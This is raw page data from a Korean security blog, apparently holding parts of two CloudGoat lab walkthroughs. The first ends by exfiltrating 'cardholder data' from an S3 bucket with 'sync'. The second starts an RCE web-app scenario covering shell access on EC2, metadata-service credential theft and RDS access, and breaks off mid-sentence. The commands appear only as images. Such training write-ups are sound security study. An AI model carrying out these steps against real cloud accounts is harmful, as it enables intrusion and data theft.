href=\"#s3-sync-%EB%AA%85%EB%A0%B9%EC%9D%84-%ED%86%B5%ED%95%B4-cardholder-data-bucket%EC%97%90%EC%84%9C-%EC%A4%91%EC%9A%94%ED%95%9C-%EB%8D%B0%EC%9D%B4%ED%84%B0-%ED%83%88%EC%B7%A8\" aria-label=\"s3 sync 명령을 통해 cardholder data bucket에서 중요한 데이터 탈취 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>S3 “SYNC” 명령을 통해 Cardholder-data Bucket에서 중요한 데이터 탈취</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.555555555555557%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkUlEQVQI1x3F2QqCQABAUSspkRZzaaOFzHQ0xxkVTLK3iN6q//+ZG3RejpHLhrK60XQPovaJyCqkuiJlQyQU8lDw9ho+m47vquPlKtQ8ZDs5MnX3BMsTU2eHPV5jDj2MKNaItOZStETqzjkpiUVFImritEKEmsLN0EGO9nMKT7D095j2gpEVYNkLegMHoz/7/wN/CjhaseHfUQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"7\"\n        title=\"7\"\n        src=\"/static/8ffe0df924ce57859e529560d0bcac7c/37523/7.png\"\n        srcset=\"/static/8ffe0df924ce57859e529560d0bcac7c/e9ff0/7.png 180w,\n/static/8ffe0df924ce57859e529560d0bcac7c/f21e7/7.png 360w,\n/static/8ffe0df924ce57859e529560d0bcac7c/37523/7.png 720w,\n/static/8ffe0df924ce57859e529560d0bcac7c/302a4/7.png 1080w,\n/static/8ffe0df924ce57859e529560d0bcac7c/07a9c/7.png 1440w,\n/static/8ffe0df924ce57859e529560d0bcac7c/9fafa/7.png 1565w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>s3 bucket 내에 존재하는 데이터를 나열하여 추출할 데이터의 이름을 수집합니다</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxElEQVQI1y3Di06CUACAYTSdc21WTKUVGHEHGddzPHAQxNV6/zf621rf9hlS3SkqTa+/KPUPVTtS/++Hb1o1o84DczJxz2e03zOlV1Qo6fyOKG7xwxrXKzAPnxhC3ojTlrLqCZqZNL+QZoK86GjESKtuiODCaEvGD4V+F4yOwLU8tqbN/uhxfA04WD7bRwsjiCrCuKYoe6J6oqgH4qShLK9kmSQ5S9x9iLO2cTYOp80Je/XGbm2yXL1gLHYYy6e/i4dnfgHeNlgmzUZeQAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"8\"\n        title=\"8\"\n        src=\"/static/a2c2ddd6e15f1169848cf15abb1e7351/37523/8.png\"\n        srcset=\"/static/a2c2ddd6e15f1169848cf15abb1e7351/e9ff0/8.png 180w,\n/static/a2c2ddd6e15f1169848cf15abb1e7351/f21e7/8.png 360w,\n/static/a2c2ddd6e15f1169848cf15abb1e7351/37523/8.png 720w,\n/static/a2c2ddd6e15f1169848cf15abb1e7351/302a4/8.png 1080w,\n/static/a2c2ddd6e15f1169848cf15abb1e7351/2a08f/8.png 1422w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>S3 bucket 내의 데이터를 로컬로 다운로드 받을 수 있도록 sync 를 진행하여 목표인 파일을 추출 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 54.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACzUlEQVQoz22Ra0uTARiGR5HVNt37ui01syiKNHVubkMzD5lblmaZhzyUSSstN7JazjJXMg95yt6aipbF1gpbrQnZiQrSigo6EPSHrtiqD0UfLm544L644ZElp6xHnbAGUZtMrLgqijxOE0VUJxIXH7kloF61mnhtEoI6CUGz+ldq16BJXBftRm5xYiIyTfJaRG1StKhUqYmRC+zebqapMp/ibWnYD5XRUm9hf4WRK5famB5w4u1rxzd+mQlpkEFJ4t6DMF++fcfWYkeWkJyCoElCEacmVtCwXBlPywELbpsVV/NOrp9twD/aTeuRWjqdxwn5xhnqOsRQrwNpwEXA28OrRwE+vHlOY109MkGbSKyoZYVCxUqFKrqwsiiNnsMlzJxvYvCYhUC/k+BNL+HZAK9fvcZ17hS25j28vzvGZ18vX4NeXk65aSwvQaYSNchjxV9CpYplChFHTQlt5XrcRyu45W5l0tnAs8AkPxaesTgfYn5ujo72Ru54uxn1nODBlIfbYy7SM1KRrVAIv2VClGVyFUeqy5l01THlqsdevZ1r7bW89Y1yu7+LheAML2Z9OBwHGeho4nRbDe5OO6O9XZhMZmR/RBEiS5fEKLjQ4SR0Z4Y5/w2uj40wLQ3zKTTDm4d+Fu96eSx1My0NIg156DztwN5QRaWlgGyd/n9COZ6ey8yHnxL0B3kSDLMYDrLgv8piyM/HsJ93IR83Rvqprqphl9VK475ybDV7yDGa/hEqBZYuV9LRchjfcA/XLp1nzOPB4zpD814rtTsLkS66uD8xTN9JG3tLrWxavxZrnpn25joKcvP+FkaIkasoK97Gwcrd7MjfSoHZQJ4xi0JTFubMVHKMRiwF+dRXlFK6o4jUDSkU6VNprS2jMHfrv0IVkSdt3JyOwWBCrzeg1+mjGHQ6dBkZZOoM6PSmaGZnG8lIT8eUpcNalM+WtEx+Aknkp94fb+b6AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"9\"\n        title=\"9\"\n        src=\"/static/3225eaf09493dfc67ef633f0ef4167f6/37523/9.png\"\n        srcset=\"/static/3225eaf09493dfc67ef633f0ef4167f6/e9ff0/9.png 180w,\n/static/3225eaf09493dfc67ef633f0ef4167f6/f21e7/9.png 360w,\n/static/3225eaf09493dfc67ef633f0ef4167f6/37523/9.png 720w,\n/static/3225eaf09493dfc67ef633f0ef4167f6/302a4/9.png 1080w,\n/static/3225eaf09493dfc67ef633f0ef4167f6/d073d/9.png 1297w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%B0%EC%84%A4%EC%A0%95\">시나리오 환결설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#ec2-instance-ip-%EB%B6%84%EC%84%9D%EB%B0%8F-%ED%99%9C%EC%9A%A9\">EC2 Instance, IP 분석및 활용</a></li>\n<li><a href=\"#ec2-metadata-service-query%EB%A5%BC-%EC%9C%84%ED%95%B4-%EC%9E%98%EB%AA%BB-%EA%B5%AC%EC%84%B1%ED%95%9C-reverse-proxy%EB%A5%BC-exploit\">EC2 Metadata Service Query를 위해 잘못 구성한 reverse proxy를 Exploit</a></li>\n<li><a href=\"#%EC%83%81%ED%98%B8-%EC%97%B0%EA%B2%B0%EB%90%9C-ec2-%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4-%ED%94%84%EB%A1%9C%ED%8C%8C%EC%9D%BC%EC%9D%84-%EA%B0%80%EC%A0%95\">상호 연결된 EC2 인스턴스 프로파일을 가정</a></li>\n<li><a href=\"#s3-bucket-%EB%A6%AC%EC%8A%A4%ED%8A%B8\">S3 Bucket 리스트</a></li>\n<li><a href=\"#s3-sync-%EB%AA%85%EB%A0%B9%EC%9D%84-%ED%86%B5%ED%95%B4-cardholder-data-bucket%EC%97%90%EC%84%9C-%EC%A4%91%EC%9A%94%ED%95%9C-%EB%8D%B0%EC%9D%B4%ED%84%B0-%ED%83%88%EC%B7%A8\">S3 “SYNC” 명령을 통해 Cardholder-data Bucket에서 중요한 데이터 탈취</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 4 (CloudGoat: Cloud Breach s3)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-4/"}},"prev":{"id":"b2cef6fb-3569-509d-9a20-b4913141dbfd","html":"<h1 id=\"클라우드-서비스-취약점-분석-7\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-7\" aria-label=\"클라우드 서비스 취약점 분석 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 7</h1>\n<h1 id=\"scenario-6--rce-web-app\" style=\"position:relative;\"><a href=\"#scenario-6--rce-web-app\" aria-label=\"scenario 6  rce web app permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 6]:  RCE Web APP</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Medium\nDifficulty: Hard\nCommand: $ ./cloudgoat.py create rce_web_app</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>VPC (ELB, EC2, S3*3, RDS)</li>\n<li>IAM user * 2</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User (Lara)</li>\n<li>IAM User (McDuck)</li>\n<li>RCE취약점이 발생하는 웹 애플리케이션에서 원격 코드를 실행하고 VPC 내부에서 root EC2 액세스 권한 획득</li>\n<li>권한 상승이 가능한 정책이 사용가능한 Instance profile에 정의</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>RDS 데이터베이스에서 비밀 저장소를 찾아야 합니다.</li>\n<li>IAM User Lara로 시작해서 AWS 환경을 분석을 하는 중에 로드 밸랜서, S3 Bucket을 분석하면서 취약한 웹 애플리케이션에 대한 RCE Exploit을 시도합니다.</li>\n<li>RCE를 통해서 RDS 데이터베이스에 접근합니다.</li>\n<li>두 번째 IAM 사용자 McDuck으로 시작해서 S3 Bucket을 열거한 결과 EC2 서버와 데이터베이스에 대해 직접적인 액세스 권한을 부여하는 SSH키를 찾을 수 있습니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 113.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"32.png\"\n        title=\"32.png\"\n        src=\"/static/eab578a4583e2d18ce8f2c2ba64a02f9/37523/32.png\"\n        srcset=\"/static/eab578a4583e2d18ce8f2c2ba64a02f9/e9ff0/32.png 180w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/f21e7/32.png 360w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/37523/32.png 720w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/302a4/32.png 1080w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/07a9c/32.png 1440w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/4435f/32.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAv0lEQVQY05WQyw6CMBBFq4hIGnkWxKoNL1EMAa260Gh05/9/0TU0kXVdTG5uMjk5M8R2IliUwaKhSnv+6wzjiY+R4anUHSLSBku+w2pTI1oU6HvCK7i+wGQaDkBdMCkriazoUFYnrMVBAfmmRsAymBYDGbvDsg5UAdO8RVZ2CrzdnZWtFwgYZvC3JZGXF5r2jqN8otpfIK9v3B4flT24t7bsWP/kONkijHOwRQE3ELBpAjrnoA7HdBYpS8PU/+EXQqGOtkYqHLoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/96542c3b07b295e4334d033d992741d0/37523/0.png\"\n        srcset=\"/static/96542c3b07b295e4334d033d992741d0/e9ff0/0.png 180w,\n/static/96542c3b07b295e4334d033d992741d0/f21e7/0.png 360w,\n/static/96542c3b07b295e4334d033d992741d0/37523/0.png 720w,\n/static/96542c3b07b295e4334d033d992741d0/302a4/0.png 1080w,\n/static/96542c3b07b295e4334d033d992741d0/f2331/0.png 1427w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<p><strong>Lara IAM 사용자를 사용하여 exploit</strong></p>\n<ul>\n<li>Lara 사용자, 공격자는 AWS 환경을 분석하고 Security Load Balance 뒤에 호스팅되는 웹 애플리케이션을 발견할 수 있습니다.</li>\n<li>공격자는 S3 Bucket을 나열하여 로드 밸런서에 대한 로그가 포함되어진 버킷을 발견하였습니다.</li>\n<li>로드 밸런서 로그의 내용을 분석하는 동안 공격자는 웹 애플리케이션에 Security Admin Page가 있음을 확인할 수 있습니다.</li>\n<li>Security Admin URL을 방문하면 공격자는 웹 애플리케이션상에서 Security Paramter를 통해서 RCE 공격을 수행할 수 있다는 것을 발견할 수 있습니다.</li>\n<li>공격자는 해당 취약점을 이용하여 웹 애플리케이션을 호스팅하는 EC2 인스턴에 대한 쉘 권한을 획득할 수 있습니다.</li>\n</ul>\n<p><strong>Shell 권한 획득 후 두 가지 방향</strong></p>\n<ol>\n<li>EC2 메타데이터 서비스를 Exploit 해서 DB 정보를 수집합니다.\n<ul>\n<li>EC2 메타데이터 서비스를 쿼리를 통해서 RDS 데이터베이스 Credential 과 Address 정보를 